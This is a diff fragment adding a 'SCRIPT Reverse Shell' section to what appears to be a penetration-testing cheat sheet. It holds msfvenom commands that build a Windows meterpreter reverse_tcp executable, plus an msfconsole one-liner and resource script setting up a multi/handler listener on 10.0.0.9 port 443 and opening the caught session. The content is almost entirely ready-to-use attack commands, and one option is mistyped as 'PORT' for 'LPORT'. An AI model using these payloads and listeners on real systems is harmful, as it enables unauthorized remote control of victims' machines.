@@ -24,3 +24,21 @@ msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp
 
 # One liner start meterpreter
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
+
+
+======================
+ SCRIPT Reverse Shell
+======================
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> PORT=4444 -f exe > shell.exe
+- msfconsole -r msfremote_shell.rc   :: Execute the script
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.9
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
+- sessions -i 1
+
+
